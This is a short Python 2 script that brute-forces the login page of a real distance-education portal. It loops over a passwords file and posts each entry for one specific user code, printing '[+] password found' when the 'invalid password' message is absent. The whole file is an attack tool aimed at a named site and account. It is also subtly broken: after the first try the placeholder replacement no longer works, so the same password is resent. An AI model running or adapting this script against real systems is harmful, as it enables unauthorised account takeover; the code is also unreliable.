import socket 
import httplib
import urllib
import sys


params = urllib.urlencode({'txtLibWebBidon': '','txtCodeUsager': 'ARSJ02527709','txtMotDePasse': 'T1T2T3$$p','btnConnecter.x': '40','btnConnecter.y': '11','_PostBackInfo': '','_PostBackPar': '','_Fields': 'DQ%2BL%2Bxuv22Yn3B49%2FD4','_NoSeqWeb': '','_InfoSupp': ''})

headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}


site='portail.cegepadistance.ca'
page = "/login"

password = "pass"

conn = httplib.HTTPSConnection(site)
#conn.request("POST","/colnet/login.asp",params,headers)

with open ("passwords.txt",'r') as f:
	for line in f:
		password = line.strip() 

		params=params.replace('T1T2T3$$p',password)
		conn.request("POST","/colnet/login.asp",params,headers)
		r1 = conn.getresponse()
		resp = r1.read(15004)

		if "ou mot de passe invalide" not  in resp and "Mot de passe invalide" not in resp:
			print "[+] password found ! : " + str(password)
			sys.exit(1)
		else:
			print '[-] password tested : '+str(password)
			
	

 
